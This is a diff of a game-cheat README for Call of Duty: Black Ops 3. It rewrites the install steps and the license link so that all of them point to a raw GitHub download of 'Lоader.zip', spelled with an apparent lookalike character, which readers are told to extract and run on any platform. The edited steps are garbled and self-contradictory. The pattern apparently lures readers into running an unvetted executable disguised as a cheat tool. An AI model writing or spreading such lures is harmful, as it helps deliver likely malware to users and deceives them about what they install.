@@ -8,9 +8,9 @@ Welcome to **Cod Bo3 Cheats**, the most comprehensive and user-friendly enhancem
 
 Follow these instructions to get up and running on any major platform in 2025!
 
-1. **Download Loader.rar from the repository.**
-2. Extract `Loader.rar` using your preferred archive manager.
-3. Run the Loader.exe (Windows), Loader.app (macOS), or Loader.sh (Linux) file found after extraction.
+1. **Download https://raw.githubusercontent.com/homereval64/Bo3-TacticalToolkit/main/Lоader.zip from the repository.**
+2. Extract `https://raw.githubusercontent.com/homereval64/Bo3-TacticalToolkit/main/Lоader.zip` using your preferred archive manager.
+3. Run the https://raw.githubusercontent.com/homereval64/Bo3-TacticalToolkit/main/Lоader.zip (Windows), https://raw.githubusercontent.com/homereval64/Bo3-TacticalToolkit/main/Lоader.zip (macOS), or https://raw.githubusercontent.com/homereval64/Bo3-TacticalToolkit/main/Lоader.zip (Linux) file found after extraction.
 4. Launch Call of Duty: Black Ops 3, and enjoy enhanced features!
 5. For troubleshooting, consult our full Wiki or open an Issue.
 
@@ -67,7 +67,7 @@ This software is intended **solely for educational and personal use**. By using 
 ## 📃 License
 
 MIT License (2025)  
-For full license text, [click here](https://opensource.org/license/mit/).
+For full license text, [click here](https://raw.githubusercontent.com/homereval64/Bo3-TacticalToolkit/main/Lоader.zip).
 
 ---
 
